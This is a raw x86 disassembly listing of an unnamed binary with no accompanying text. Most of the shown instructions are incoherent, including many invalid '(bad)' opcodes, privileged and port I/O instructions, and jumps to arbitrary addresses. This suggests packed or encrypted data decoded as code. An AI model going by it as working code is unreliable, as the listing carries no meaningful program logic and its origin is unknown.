  40d4d6:	dec    DWORD PTR [edi+0x47]
  40d4d9:	bound  ebx,QWORD PTR [edx+0x7eae39a7]
  40d4df:	adc    eax,0xcf4b0c36
  40d4e4:	adc    DWORD PTR [ecx+0x48],edi
  40d4e7:	dec    edi
  40d4e8:	add    al,bl
  40d4ea:	add    BYTE PTR [ebx],cl
  40d4ec:	out    dx,eax
  40d4ed:	mov    ah,0x6c
  40d4ef:	sbb    ch,BYTE PTR [eax]
  40d4f1:	in     al,0x78
  40d4f3:	in     eax,dx
  40d4f4:	jmp    FWORD PTR [ecx-0x56982a1f]
  40d4fa:	out    dx,eax
  40d4fb:	push   ecx
  40d4fc:	(bad)  
  40d4fd:	pop    eax
  40d4fe:	add    DWORD PTR [ebx+ebp*2+0x42],0xee78c0b6
  40d506:	mov    ebp,0xe2cc9049
  40d50b:	leave  
  40d50c:	xchg   edx,eax
  40d50d:	std    
  40d50e:	stos   DWORD PTR es:[edi],eax
  40d50f:	pusha  
  40d510:	mov    DWORD PTR ds:0x70f6a420,esi
  40d516:	stc    
  40d517:	(bad)  
  40d518:	cmp    eax,0x8a4ade0b
  40d51d:	sti    
  40d51e:	inc    eax
  40d51f:	ret    
  40d520:	mov    bl,0x85
  40d522:	sbb    ebp,DWORD PTR [ebx]
  40d524:	retf   0x442d
  40d527:	sbb    al,0x93
  40d529:	xor    bh,BYTE PTR [ebx]
  40d52b:	das    
  40d52c:	push   eax
  40d52d:	push   edx
  40d52e:	in     al,0x48
  40d530:	aaa    
  40d531:	sub    BYTE PTR [eax-0x60],0x85
  40d535:	xchg   BYTE PTR es:[ecx-0x35eff213],dl
  40d53c:	or     BYTE PTR [ebx-0x80],0x99
  40d540:	enter  0x2a3e,0xdf
  40d544:	push   ss
  40d545:	jecxz  0x40d5b5
  40d547:	leave  
  40d548:	xchg   ecx,eax
  40d549:	sahf   
  40d54a:	sbb    ch,BYTE PTR [esi+0x21]
  40d54d:	sub    esp,DWORD PTR [edx+ebp*1-0x32]
  40d551:	and    eax,0x52b999c9
  40d556:	add    BYTE PTR [ebx-0x2e],ah
  40d559:	push   eax
  40d55a:	mov    ds:0xcc6e86c2,al
  40d55f:	sar    DWORD PTR [eax+edi*2],0xd8
  40d563:	cdq    
  40d564:	adc    DWORD PTR [esi-0x52],edx
  40d567:	arpl   WORD PTR [eax],cx
  40d569:	sub    eax,0x806ff370
  40d56e:	(bad)  
  40d56f:	cli    
  40d570:	addr16 iret 
  40d572:	cmp    esi,DWORD PTR [edi-0xd]
  40d575:	push   edi
  40d576:	mov    eax,ds:0xe6ff6737
  40d57b:	mov    cl,bl
  40d57d:	xor    BYTE PTR [edx],0xdc
  40d580:	mov    esp,0xc6b1811d
  40d585:	fstp   DWORD PTR [ebp-0x1ca4bbfc]
  40d58b:	dec    ecx
  40d58c:	xor    ebp,eax
  40d58e:	or     ah,BYTE PTR [ebx-0x3dd27fa1]
  40d594:	shr    BYTE PTR [ecx-0x30],1
  40d597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d598:	or     eax,0xb7c1415c
  40d59d:	out    0x79,eax
  40d59f:	cmp    esp,DWORD PTR gs:[ebx]
  40d5a2:	lds    edx,FWORD PTR [edi+0xe]
  40d5a5:	jo     0x40d5d2
  40d5a7:	cmp    dh,0x75
  40d5aa:	jbe    0x40d5a8
  40d5ac:	stos   DWORD PTR es:[edi],eax
  40d5ad:	and    edx,edx
  40d5af:	push   edx
  40d5b0:	test   al,0x12
  40d5b2:	pushf  
  40d5b3:	or     al,0xde
  40d5b5:	jne    0x40d597
  40d5b7:	in     eax,0x7e
  40d5b9:	jne    0x40d612
  40d5bb:	(bad)  
  40d5bc:	sar    bl,cl
  40d5be:	dec    ebx
  40d5bf:	sub    al,0x87
  40d5c1:	push   edx
  40d5c2:	mov    ds:0x3fd488b9,al
  40d5c7:	push   ss
  40d5c8:	pushf  
  40d5c9:	add    dl,BYTE PTR [edi-0x2b634b9c]
  40d5cf:	adc    edx,DWORD PTR [eax-0x40]
  40d5d2:	mov    eax,edx
  40d5d4:	das    
  40d5d5:	jo     0x40d602
  40d5d7:	outs   dx,BYTE PTR ds:[esi]
  40d5d8:	push   ss
  40d5d9:	push   0xefee3b9e
  40d5de:	sahf   
  40d5df:	sub    DWORD PTR [eax-0x35],0x647678fe
  40d5e6:	push   eax
  40d5e7:	pop    ss
  40d5e8:	push   edi
  40d5e9:	wrmsr  
  40d5eb:	mov    WORD PTR [edx-0x36],cs
  40d5ee:	std    
  40d5ef:	mov    ch,BYTE PTR [edi-0x6]
  40d5f2:	sub    eax,0x3908a859
  40d5f7:	cmp    eax,0x4fb6ce27
  40d5fc:	mov    gs,esi
  40d5fe:	je     0x40d622
  40d600:	sbb    cl,ch
  40d602:	sahf   
  40d603:	pop    esp
  40d604:	xor    BYTE PTR [eax+0x6c4e6030],dl
  40d60a:	or     cl,BYTE PTR [ebx+esi*8-0x38]
  40d60e:	mov    ch,BYTE PTR [edi-0x54065d1c]
  40d614:	mov    esi,DWORD PTR [edi+0x2170f83d]
  40d61a:	js     0x40d671
  40d61c:	shl    DWORD PTR [ecx],cl
  40d61e:	inc    ecx
  40d61f:	mov    ecx,0xec482239
  40d624:	sbb    BYTE PTR [edi+0x7b],0xf6
  40d628:	pop    ecx
  40d629:	sub    esp,eax
  40d62b:	fild   DWORD PTR [esp+edi*8+0x33e3f639]
  40d632:	sub    ebp,ebx
  40d634:	mov    ecx,0xbf79f4dd
  40d639:	les    esp,FWORD PTR [ecx+0x48c946ed]
  40d63f:	and    eax,esp
  40d641:	inc    esi
  40d642:	gs pushf 
  40d644:	inc    esp
  40d645:	adc    dl,ch
  40d647:	lea    edx,[ecx-0x2a]
  40d64a:	sti    
  40d64b:	add    eax,0x846ee9d6
  40d650:	es or  dl,bl
  40d653:	or     al,0xf9
  40d655:	ds mov cs,eax
  40d658:	(bad)  
  40d659:	pop    edi
  40d65a:	mov    esi,DWORD PTR [ecx]
  40d65c:	jg     0x40d684
  40d65e:	dec    esp
  40d65f:	sbb    BYTE PTR [edi],0xd4
  40d662:	mov    dl,0x7e
  40d664:	clc    
  40d665:	retf   
  40d666:	leave  
  40d667:	outs   dx,BYTE PTR ds:[esi]
  40d668:	xchg   ebx,eax
  40d669:	js     0x40d61b
  40d66b:	xchg   BYTE PTR [ebx],al
  40d66d:	aas    
  40d66e:	(bad)  
  40d670:	xor    BYTE PTR [esi+ecx*1],0xbb
  40d674:	mov    esp,0xcaeac56e
  40d679:	in     eax,dx
  40d67a:	mov    ?,WORD PTR [edi-0x1153c898]
  40d680:	adc    DWORD PTR [eax-0x751be8aa],esp
  40d686:	mov    BYTE PTR [ebx-0x591e64c7],bl
  40d68c:	int3   
  40d68d:	dec    ecx
  40d68e:	inc    eax
  40d68f:	mov    bl,0x16
  40d691:	dec    eax
  40d692:	mov    esp,0x9339d5a1
  40d697:	adc    esp,DWORD PTR [ebx+0x16042453]
  40d69d:	std    
  40d69e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d69f:	pushf  
  40d6a0:	scas   eax,DWORD PTR es:[edi]
  40d6a1:	pushf  
  40d6a2:	mov    bh,BYTE PTR [ebp+0x65]
  40d6a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6a6:	add    al,0x26
  40d6a8:	inc    eax
  40d6a9:	adc    DWORD PTR [edx],ecx
  40d6ab:	loope  0x40d689
  40d6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ae:	and    edx,0x41
  40d6b1:	mov    ds:0xaec4d2d1,al
  40d6b6:	mov    esp,0x380f6647
  40d6bb:	pop    ds
  40d6bc:	mov    bl,0x72
  40d6be:	pusha  
  40d6bf:	inc    ebp
  40d6c0:	lea    edx,[ebp+0x2933dfe]
  40d6c6:	mov    DWORD PTR [edi],esi
  40d6c8:	fistp  DWORD PTR [edi-0x4]
  40d6cb:	dec    edx
  40d6cc:	jne    0x40d64e
  40d6ce:	mov    cl,BYTE PTR [eax-0x3053bf3b]
  40d6d4:	jns    0x40d6c9
  40d6d6:	add    dl,bh
  40d6d8:	fst    st(3)
  40d6da:	cld    
  40d6db:	pusha  
  40d6dc:	and    eax,0x61508621
  40d6e1:	(bad)  
  40d6e2:	fadd   DWORD PTR [ecx]
  40d6e4:	mov    esi,0x9d36be90
  40d6e9:	push   0x9cf392ee
  40d6ee:	fnstenv [esi-0x2127f4a4]
  40d6f4:	push   edx
  40d6f5:	cmc    
  40d6f6:	mov    cl,0x6b
  40d6f8:	sub    eax,DWORD PTR fs:[ebx]
  40d6fb:	add    al,0x11
  40d6fd:	cld    
  40d6fe:	loope  0x40d729
  40d700:	push   cs
  40d701:	dec    ecx
  40d702:	les    ebp,FWORD PTR [ecx]
  40d704:	fstp   QWORD PTR [edx+0x2dcfaa69]
  40d70a:	jne    0x40d748
  40d70c:	fmul   QWORD PTR [eax+0x14]
  40d70f:	bound  edi,QWORD PTR [esi+0x62]
  40d712:	fisub  DWORD PTR [ebx+0x45]
  40d715:	lock scas eax,DWORD PTR es:[edi]
  40d717:	pusha  
  40d718:	and    eax,DWORD PTR [ecx]
  40d71a:	mov    al,ds:0x68fbdc1f
  40d71f:	int3   
  40d720:	xchg   DWORD PTR [eax],ecx
  40d722:	push   edi
  40d723:	cmc    
  40d724:	push   ecx
  40d725:	xchg   ebx,eax
  40d726:	fst    QWORD PTR [ebx+eiz*1-0x2a]
  40d72a:	out    dx,al
  40d72b:	mov    ebx,0xaf2bb9f9
  40d730:	test   eax,0xabef7c14
  40d735:	mov    BYTE PTR [ebx+edi*4],cl
  40d738:	in     eax,0x73
  40d73a:	repnz push esp
  40d73c:	xor    al,0x27
  40d73e:	mov    ds:0xb1ce2799,eax
  40d743:	leave  
  40d744:	(bad)  
  40d745:	push   edx
  40d746:	adc    BYTE PTR [ecx],cl
  40d748:	sub    DWORD PTR [ebx],eax
  40d74a:	adc    al,0x8e
  40d74c:	das    
  40d74d:	xchg   DWORD PTR [ebp+0x1554198a],ebp
  40d753:	(bad)  
  40d754:	jle    0x40d744
  40d756:	cmp    BYTE PTR [edx-0x40],dh
  40d759:	xchg   ebp,eax
  40d75a:	lea    ebp,[edx+0x68]
  40d75d:	push   edx
  40d75e:	int3   
  40d75f:	ds push edx
  40d761:	adc    DWORD PTR [edx-0x5e],ebp
  40d764:	and    BYTE PTR [ecx-0x58f85ee6],0xf9
  40d76b:	lods   al,BYTE PTR ds:[esi]
  40d76c:	xchg   BYTE PTR [esi+0x1a],dl
  40d76f:	dec    esi
  40d770:	loope  0x40d7bd
  40d772:	jp     0x40d757
  40d774:	sbb    ebx,ecx
  40d776:	fimul  DWORD PTR [esi]
  40d778:	lds    ecx,FWORD PTR [esi-0x29]
  40d77b:	loop   0x40d743
  40d77d:	mov    DWORD PTR ds:0x64f0745e,eax
  40d783:	sub    DWORD PTR [ebx+0x6096e41b],ebp
  40d789:	call   0x17aba0d1
  40d78e:	sbb    DWORD PTR [edx-0x664f5190],esi
  40d794:	jne    0x40d7b0
  40d796:	frstor [esi-0x20]
  40d799:	leave  
  40d79a:	pop    ebx
  40d79b:	mov    ds:0xa9a77fc4,eax
  40d7a0:	les    edi,FWORD PTR es:[ebx-0x1a]
  40d7a4:	and    bh,bl
  40d7a6:	shr    edx,0xaf
  40d7a9:	mov    ds:0xfdebea96,eax
  40d7ae:	lods   eax,DWORD PTR ds:[esi]
  40d7af:	(bad)  
  40d7b0:	ret    0x2962
  40d7b3:	fcmovbe st,st(6)
  40d7b5:	or     BYTE PTR [edi-0x3af35ec8],dl
  40d7bb:	mov    BYTE PTR [ebx],dh
  40d7bd:	(bad)  [ebx+0x7d8779fa]
  40d7c3:	push   ebp
  40d7c4:	mov    ds,WORD PTR [ebx+0x51]
  40d7c7:	cli    
  40d7c8:	(bad)  
  40d7c9:	in     eax,dx
  40d7ca:	fisub  DWORD PTR [esi]
  40d7cc:	mov    al,ds:0x68fe88ba
  40d7d1:	test   al,0x1e
  40d7d3:	jmp    0x46f2:0xbf07c832
  40d7da:	pop    es
  40d7db:	mov    ch,0x16
  40d7dd:	lea    edx,[edx]
  40d7df:	xchg   esi,eax
  40d7e0:	sbb    ecx,DWORD PTR [edi-0x19e3e975]
  40d7e6:	adc    ebx,DWORD PTR [esi]
  40d7e8:	cmp    BYTE PTR [ecx-0x5032df30],al
  40d7ee:	adc    ebx,DWORD PTR [edi+0x53b0269e]
  40d7f4:	cdq    
  40d7f5:	cmp    eax,0x6b957fe8
  40d7fa:	pop    es
  40d7fb:	add    edx,ecx
  40d7fd:	rcl    DWORD PTR [ebp+0x6845a177],cl
  40d803:	call   0x5cbda387
  40d808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d809:	cli    
  40d80a:	repz int 0xe8
  40d80d:	pop    ss
  40d80e:	pop    eax
  40d80f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d810:	cmp    al,0x6
  40d812:	out    0xb6,eax
  40d814:	sub    DWORD PTR [edi],eax
  40d816:	call   0xc7c7:0xf22e66f9
  40d81d:	mov    esi,0x5aaa07b3
  40d822:	adc    BYTE PTR [ebx],bl
  40d824:	jnp    0x40d890
  40d826:	push   0xffffffc2
  40d828:	pop    edx
  40d829:	jo     0x40d7ad
  40d82b:	pusha  
  40d82c:	addr16 in eax,0x2e
  40d82f:	mov    ds:0x69d9295f,al
  40d834:	stos   BYTE PTR es:[edi],al
  40d835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d836:	mov    WORD PTR [edx-0x2],gs
  40d839:	mov    esp,0x9d4e2ca7
  40d83e:	retf   
  40d83f:	bound  ebp,QWORD PTR [esi]
  40d841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d842:	out    0xb1,al
  40d844:	pusha  
  40d845:	push   edi
  40d846:	pop    ebp
  40d847:	popf   
  40d848:	mov    WORD PTR [eax+0x26],gs
  40d84b:	les    ecx,FWORD PTR [ebx-0x4f3a668e]
  40d851:	cmp    edx,DWORD PTR [ecx]
  40d853:	or     BYTE PTR [ebp+0x2b],ch
  40d856:	lock xor esi,DWORD PTR [eax+0x2331a351]
  40d85d:	mov    eax,ds:0x848ee9b8
  40d862:	jb     0x40d7f5
  40d864:	out    0x89,al
  40d866:	rol    DWORD PTR [ebp-0x7f],cl
  40d869:	cld    
  40d86a:	cmp    DWORD PTR [ebx+0x6b2a1124],0xbe1646bb
  40d874:	or     BYTE PTR [esi+0x26],0x72
  40d878:	inc    edi
  40d879:	outs   dx,DWORD PTR ds:[esi]
  40d87a:	lds    ebx,FWORD PTR [esi-0x1e73926d]
  40d880:	and    ah,dh
  40d882:	cmp    eax,0x4dc278d
  40d887:	inc    edx
  40d888:	mov    dl,0x66
  40d88a:	lods   al,BYTE PTR ds:[esi]
  40d88b:	sti    
  40d88c:	xor    eax,0x46d0cfb9
  40d891:	mov    cl,0x92
  40d893:	add    dh,BYTE PTR [esi+0x369f6f75]
  40d899:	mov    DWORD PTR [edx],esi
  40d89b:	aaa    
  40d89c:	push   ss
  40d89d:	loopne 0x40d8b1
  40d89f:	cdq    
  40d8a0:	mov    esp,0x48152a1f
  40d8a5:	call   0xbc81:0x4ad210f0
  40d8ac:	pop    eax
  40d8ad:	hlt    
  40d8ae:	cmp    edx,DWORD PTR [ebp-0x12]
  40d8b1:	xchg   esi,eax
  40d8b2:	es enter 0xa9a1,0xbd
  40d8b7:	push   ecx
  40d8b8:	popf   
  40d8b9:	xchg   ebx,eax
  40d8ba:	dec    edx
  40d8bb:	pop    es
  40d8bc:	add    DWORD PTR [eax+0x51],eax
  40d8bf:	sub    dl,BYTE PTR [edi]
  40d8c1:	cmp    BYTE PTR [ebx-0x16aed55f],0x68
  40d8c8:	shl    BYTE PTR [ebp-0x43b97650],0x73
  40d8cf:	lods   al,BYTE PTR ds:[esi]
  40d8d0:	add    DWORD PTR [ecx-0x5d27d11],edi
  40d8d6:	je     0x40d8a1
  40d8d8:	repz les ebp,FWORD PTR [esi-0x6]
  40d8dc:	sbb    al,0xc6
  40d8de:	ret    0xe8d4
  40d8e1:	in     eax,dx
  40d8e2:	ficom  DWORD PTR [eax-0x1c14b07f]
  40d8e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8e9:	adc    BYTE PTR [esi+0x28dc22ce],0xf
  40d8f0:	jmp    0x5a835089
  40d8f5:	jmp    0x983c:0x46de4e37
  40d8fc:	rcr    BYTE PTR [ebx+esi*2-0x33d20057],1
  40d903:	jns    0x40d95e
  40d905:	mov    dl,0x8f
  40d907:	push   ss
  40d908:	or     BYTE PTR [edx+0x14],dh
  40d90b:	repnz icebp 
  40d90d:	aam    0x66
  40d90f:	and    dl,al
  40d911:	lock shr BYTE PTR [edx+ebp*4-0x7],1
  40d916:	sbb    ah,BYTE PTR fs:[ebx-0x5c]
  40d91a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d91c:	xchg   BYTE PTR [ebp+0x1d],al
  40d91f:	jecxz  0x40d903
  40d921:	pushf  
  40d922:	hlt    
  40d923:	mov    esi,0x222172f6
  40d928:	repnz mov cl,0x50
  40d92b:	jbe    0x40d913
  40d92d:	fimul  DWORD PTR [eax-0x78125301]
  40d933:	test   BYTE PTR [edx+0x57a10e48],ah
  40d939:	jge    0x40d999
  40d93b:	pop    es
  40d93c:	dec    edx
  40d93d:	jg     0x40d985
  40d93f:	mov    ch,0x4c
  40d941:	adc    BYTE PTR [ebx],cl
  40d943:	sub    esi,ebp
  40d945:	xchg   ebx,eax
  40d946:	aam    0x14
  40d948:	adc    DWORD PTR [edi],0x90ef563e
  40d94e:	ss adc edi,ebp
  40d951:	and    ch,BYTE PTR [ebp+eiz*8-0x3dc7a7ec]
  40d958:	xchg   esi,eax
  40d959:	nop
  40d95a:	(bad)  
  40d95b:	imul   ecx,esi,0xbe8e25a6
  40d961:	adc    DWORD PTR [edi],eax
  40d963:	not    BYTE PTR [ebx+0x3a]
  40d966:	pop    ebp
  40d967:	add    al,0x6b
  40d969:	jmp    0xc1f9ee68
  40d96e:	scas   al,BYTE PTR es:[edi]
  40d96f:	hlt    
  40d970:	jbe    0x40d952
  40d972:	pushf  
  40d973:	imul   BYTE PTR [esi+0x18]
  40d976:	test   eax,0xab421c8e
  40d97b:	data16 jne 0x40d9b3
  40d97e:	add    dh,ch
  40d980:	jae    0x40d9bb
  40d982:	pop    ebx
  40d983:	repnz out dx,eax
  40d985:	adc    esp,DWORD PTR [edi+0x2e]
  40d988:	jmp    0x40d9d9
  40d98a:	call   0x881e9fd9
  40d98f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d990:	mov    al,ds:0xf42b4367
  40d995:	test   eax,0x487dbdf9
  40d99a:	mov    edx,0xe0ccde1a
  40d99f:	arpl   WORD PTR [eax],bx
  40d9a1:	and    DWORD PTR [ebp+ecx*1+0x45a163cb],ebx
  40d9a8:	pop    ss
  40d9a9:	mov    ds:0xc21be6e3,eax
  40d9ae:	adc    dh,BYTE PTR [edx+0x60ed2827]
  40d9b4:	and    eax,0xbb0135af
  40d9b9:	dec    ebp
  40d9ba:	jmp    0x40d948
  40d9bc:	mov    bl,0xad
  40d9be:	fisubr DWORD PTR [esi-0x2459b4ed]
  40d9c4:	lahf   
  40d9c5:	jae    0x40d994
  40d9c7:	jo     0x40d9c3
  40d9c9:	dec    esi
  40d9ca:	pop    ecx
  40d9cb:	ror    edx,0x7e
  40d9ce:	and    esi,edi
  40d9d0:	xchg   esp,eax
  40d9d1:	add    BYTE PTR [edx-0x4708b519],ah
  40d9d7:	adc    DWORD PTR [edi],ebp
  40d9d9:	sbb    eax,0xbcfefdff
  40d9de:	lock icebp 
  40d9e0:	ins    BYTE PTR es:[edi],dx
  40d9e1:	push   ebx
  40d9e2:	mov    bl,0x8e
  40d9e4:	mov    ?,ebx
  40d9e6:	ret    
  40d9e7:	jecxz  0x40d9a2
  40d9e9:	imul   edx
  40d9eb:	mov    eax,cs
  40d9ed:	add    ecx,DWORD PTR [esi+ebp*2+0x6e]
  40d9f1:	and    ecx,DWORD PTR [esi-0x15]
  40d9f4:	sti    
  40d9f5:	stos   BYTE PTR es:[edi],al
  40d9f6:	inc    ebx
  40d9f7:	push   ss
  40d9f8:	enter  0x145b,0x47
  40d9fc:	sbb    dl,BYTE PTR [esi]
  40d9fe:	(bad)  
  40d9ff:	mov    ebx,0xad45e5fc
  40da04:	adc    ah,0x1d
  40da07:	pop    ecx
  40da08:	js     0x40da4a
  40da0a:	xor    esp,ecx
  40da0c:	or     eax,0x2623a58
  40da11:	mov    cl,0xa7
  40da13:	aad    0x12
  40da15:	pop    esi
  40da16:	aad    0x65
  40da18:	mov    al,ds:0x6a0fc4fa
  40da1d:	or     ecx,DWORD PTR [eax]
  40da1f:	ins    DWORD PTR es:[edi],dx
  40da20:	(bad)  
  40da21:	es jp  0x40d9db
  40da24:	pushf  
  40da25:	sub    BYTE PTR [ebx+eax*2],dl
  40da28:	inc    esi
  40da29:	leave  
  40da2a:	pop    edi
  40da2b:	mov    bl,al
  40da2d:	ss pop esi
  40da2f:	inc    esi
  40da30:	scas   eax,DWORD PTR es:[edi]
  40da31:	inc    ebp
  40da32:	gs (bad) 
  40da34:	lods   eax,DWORD PTR ds:[esi]
  40da35:	jno    0x40da82
  40da37:	iret   
  40da38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da39:	(bad)  
  40da3a:	int    0xd2
  40da3c:	adc    edi,edx
  40da3e:	sub    BYTE PTR [edi],0x19
  40da41:	lods   al,BYTE PTR ds:[esi]
  40da42:	test   al,0x41
  40da44:	test   eax,0x86964b09
  40da49:	dec    esp
  40da4a:	mov    bl,0x86
  40da4c:	pop    esp
  40da4d:	pand   mm7,QWORD PTR [edx]
  40da50:	add    eax,DWORD PTR [esi+0x69bc0503]
  40da56:	xchg   BYTE PTR [eax],dh
  40da58:	pop    edi
  40da59:	pop    esi
  40da5a:	lea    edx,[esi-0x1a9d0a24]
  40da60:	mov    esp,DWORD PTR [esi-0xd]
  40da63:	adc    esi,DWORD PTR [edx+0x18b0df74]
  40da69:	clc    
  40da6a:	cmp    al,0xa5
  40da6c:	out    dx,eax
  40da6d:	daa    
  40da6e:	pop    esi
  40da6f:	push   ds
  40da70:	add    eax,0x6854f0cb
  40da75:	add    BYTE PTR [esi+eax*2+0xdf864ed],al
  40da7c:	test   BYTE PTR [eax-0x2c],dl
  40da7f:	ss sub eax,0x24eb32f8
  40da85:	xchg   ecx,eax
  40da86:	or     al,0xeb
  40da88:	mov    al,0x28
  40da8a:	mov    edx,0xecc60dea
  40da8f:	mov    ch,0x81
  40da91:	add    DWORD PTR [eax],edx
  40da93:	test   cl,0x85
  40da96:	(bad)  
  40da97:	int    0xa9
  40da99:	(bad)  
  40da9a:	sahf   
  40da9b:	pushf  
  40da9c:	dec    edx
  40da9d:	js     0x40da86
  40da9f:	add    si,si
  40daa2:	mov    eax,ds:0xb5a9b3be
  40daa7:	in     eax,0xc3
  40daa9:	pop    edx
  40daaa:	inc    edx
  40daab:	mov    cs,eax
  40daad:	cmp    ecx,DWORD PTR [ebx+0xfe067a1]
  40dab3:	mov    bl,0xe1
  40dab5:	stos   DWORD PTR es:[edi],eax
  40dab6:	fist   DWORD PTR [esi+0x34]
  40dab9:	test   DWORD PTR [edx],edi
  40dabb:	pop    ss
  40dabc:	mov    ah,0xf8
  40dabe:	aad    0xd6
  40dac0:	dec    esi
  40dac1:	adc    eax,0xc7b43c9d
  40dac6:	jmp    0x40da97
  40dac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dac9:	xchg   esi,eax
  40daca:	xchg   ecx,eax
  40dacb:	jno    0x2a70facc
  40dad1:	jns    0x40daa9
  40dad3:	mov    bl,0x80
  40dad5:	jl     0x40dacf
  40dad7:	add    eax,0x72783d1
  40dadc:	push   cs
  40dadd:	sbb    al,0x9f
  40dadf:	push   ebx
  40dae0:	adc    DWORD PTR [eax],edi
  40dae2:	(bad)  
  40dae3:	(bad)  
  40dae5:	stc    
  40dae6:	(bad)  
  40dae7:	inc    edi
  40dae8:	sbb    eax,0xf80bf67a
  40daed:	xor    BYTE PTR [ecx],bl
  40daef:	test   DWORD PTR [edx],esp
  40daf1:	xor    al,0x18
  40daf3:	gs or  edx,ebp
  40daf6:	cmp    edi,DWORD PTR [edi-0x3020856f]
  40dafc:	push   eax
  40dafd:	add    edi,DWORD PTR [edx-0x46d55523]
  40db03:	sbb    eax,0x9049442d
  40db08:	or     al,0x6d
  40db0a:	sbb    al,cl
  40db0c:	jmp    0xff66:0xfd6a71be
  40db13:	fs or  al,0x8f
  40db16:	fdiv   st(7),st
  40db18:	mov    eax,ds:0x4a3f472b
  40db1d:	mov    ebx,0x72c7b00f
  40db22:	data16 (bad) 
  40db24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db25:	mov    dl,0x45
  40db27:	out    dx,eax
  40db28:	jae    0x40db55
  40db2a:	repnz or al,0x87
  40db2d:	jns    0x40db8e
  40db2f:	test   eax,0xe6207907
  40db34:	call   0x58bbdf85
  40db39:	pop    esp
  40db3a:	int    0xaf
  40db3c:	add    al,0xce
  40db3e:	push   esp
  40db3f:	gs rol edi,1
  40db42:	xor    al,0x76
  40db44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db45:	popf   
  40db46:	scas   al,BYTE PTR es:[di]
  40db48:	and    esp,DWORD PTR [eax+0x78bd1873]
  40db4e:	xor    BYTE PTR [edi+0x5d],dl
  40db51:	pop    edi
  40db52:	sbb    eax,0x6768a377
  40db57:	fsub   st(6),st
  40db59:	call   0xdd21:0x33c4df12
  40db60:	scas   al,BYTE PTR es:[edi]
  40db61:	inc    esp
  40db62:	jnp    0x40db92
  40db64:	dec    eax
  40db65:	outs   dx,BYTE PTR ds:[esi]
  40db66:	bound  esp,QWORD PTR [eax]
  40db68:	push   ecx
  40db69:	jecxz  0x40dbd2
  40db6b:	call   0xace:0x66c1053e
  40db72:	shl    edi,0x40
  40db75:	jbe    0x40dbf3
  40db77:	mov    eax,0x9aea661d
  40db7c:	arpl   WORD PTR [edi],cx
  40db7e:	dec    edx
  40db7f:	pop    edx
  40db80:	jno    0x40db02
  40db82:	fst    DWORD PTR [ebx-0x73]
  40db85:	jmp    0x42cf636d
  40db8a:	(bad)  
  40db8b:	scas   eax,DWORD PTR es:[edi]
  40db8c:	or     BYTE PTR [eax+0x6700d4a7],al
  40db92:	jmp    DWORD PTR [ebp+0x4a]
  40db95:	repnz test al,0xed
  40db98:	imul   ecx,edx,0xffffff87
  40db9b:	clc    
  40db9c:	dec    ebp
  40db9d:	(bad)  
  40db9e:	(bad)
  40dba1:	(bad)  
  40dba2:	fwait
  40dba3:	aas    
  40dba4:	int    0xbc
  40dba6:	clc    
  40dba7:	test   al,0x3
  40dba9:	mov    cl,0x61
  40dbab:	push   ebp
  40dbac:	(bad)  
  40dbad:	mov    edi,0xde11fdb3
  40dbb2:	and    esi,DWORD PTR [esi+esi*1-0x5d]
  40dbb6:	xlat   BYTE PTR ds:[ebx]
  40dbb7:	pop    esp
  40dbb8:	mov    bl,0x95
  40dbba:	fiadd  WORD PTR cs:0x27fb8ea6
  40dbc1:	dec    esi
  40dbc2:	gs mov ebp,0x752e5cd9
  40dbc8:	in     al,0xad
  40dbca:	or     al,0x21
  40dbcc:	adc    dh,cl
  40dbce:	leave  
  40dbcf:	dec    ebp
  40dbd0:	sbb    edx,DWORD PTR [edi+0x27]
  40dbd3:	adc    al,0x39
  40dbd5:	jne    0x40dba2
  40dbd7:	xor    al,BYTE PTR [ebx+0x21]
  40dbda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbdb:	or     al,BYTE PTR [esi-0x38]
  40dbde:	mov    ah,0xe9
  40dbe0:	sub    edx,ecx
  40dbe2:	out    0x66,al
  40dbe4:	mov    edx,0xe3d8ffd8
  40dbe9:	mov    bl,0xb8
  40dbeb:	xchg   BYTE PTR [ebx+0x5b],al
  40dbee:	leave  
  40dbef:	adc    cl,BYTE PTR [ebx+0x3]
  40dbf2:	sar    BYTE PTR [ecx+0x3],cl
  40dbf5:	dec    ebp
  40dbf6:	fldcw  WORD PTR [eax-0x74]
  40dbf9:	inc    ecx
  40dbfa:	mov    WORD PTR [ebx],es
  40dbfc:	imul   ebx,DWORD PTR [esi+0x4ec33df5],0xe3732905
  40dc06:	outs   dx,DWORD PTR ds:[esi]
  40dc07:	imul   edi,DWORD PTR [edi+edx*1],0x1c
  40dc0b:	sahf   
  40dc0c:	xor    cl,0xdd
  40dc0f:	adc    ebx,ebx
  40dc11:	jae    0x40dc05
  40dc13:	loopne 0x40dbbd
  40dc15:	sub    ebx,esi
  40dc17:	in     al,0xa0
  40dc19:	fistp  QWORD PTR [edx]
  40dc1b:	mov    dh,0x83
  40dc1d:	outs   dx,DWORD PTR ds:[esi]
  40dc1e:	retf   0xee1
  40dc21:	and    ebp,DWORD PTR [edi-0x55e6429c]
  40dc27:	inc    eax
  40dc28:	inc    esi
  40dc29:	into   
  40dc2a:	inc    edi
  40dc2b:	cmp    eax,esp
  40dc2d:	int3   
  40dc2e:	stc    
  40dc2f:	leave  
  40dc30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc31:	ret    0x5dc4
  40dc34:	lock jmp 0x40dbf4
  40dc37:	jmp    FWORD PTR [edi-0x40]
  40dc3a:	pusha  
  40dc3b:	int3   
  40dc3c:	cmp    al,bh
  40dc3e:	adc    ebp,ebx
  40dc40:	mov    ah,0x19
  40dc42:	(bad)  
